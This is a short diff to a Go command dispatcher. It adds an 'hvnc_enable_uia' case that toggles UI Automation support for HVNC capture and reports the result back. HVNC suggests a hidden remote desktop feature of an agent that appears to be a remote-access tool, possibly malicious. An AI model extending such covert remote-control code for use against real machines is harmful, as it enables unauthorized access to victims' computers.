@@ -1071,6 +1071,18 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		capture.SetHVNCDXGIEnabled(dxgiEnabled)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
+	case "hvnc_enable_uia":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		uiaEnabled := true
+		if payload != nil {
+			if v, ok := payload["enabled"].(bool); ok {
+				uiaEnabled = v
+			}
+		}
+		log.Printf("hvnc: UIA support %v", uiaEnabled)
+		capture.SetHVNCUIAEnabled(uiaEnabled)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
 	case "hvnc_set_resolution":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		maxH := 1080
